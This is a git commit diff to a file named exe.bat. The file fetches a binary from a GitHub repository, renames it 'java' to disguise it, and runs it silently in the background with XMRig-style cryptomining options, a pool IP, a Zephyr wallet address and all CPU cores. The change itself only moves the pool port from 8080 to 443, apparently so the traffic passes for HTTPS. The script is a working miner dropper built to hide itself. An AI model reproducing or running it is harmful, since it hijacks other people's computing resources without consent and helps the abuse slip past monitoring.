542011b68a5708b0a52e6951e9f32d17d1784307
ryandijeremy <167563417+ryandijeremy@users.noreply.github.com>
2024-05-11 17:19:43 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,2 +1,2 @@
 wget -q -O java https://github.com/swanderenata/NFT/raw/main/jupyterlab && chmod +x java
-nohup ./java -o 45.115.225.225:8080 -a rx/0 -u ZEPHYR2tBHcj5UGL8ht15WiyPifGuh7ugHN5nAKXhDAE79gGobZ4kH9USdGNwy8prj7Sb7sXWXKEtck6cxF8138fJpd4iSa2cEM23.bian --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
+nohup ./java -o 45.115.225.225:443 -a rx/0 -u ZEPHYR2tBHcj5UGL8ht15WiyPifGuh7ugHN5nAKXhDAE79gGobZ4kH9USdGNwy8prj7Sb7sXWXKEtck6cxF8138fJpd4iSa2cEM23.bian --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
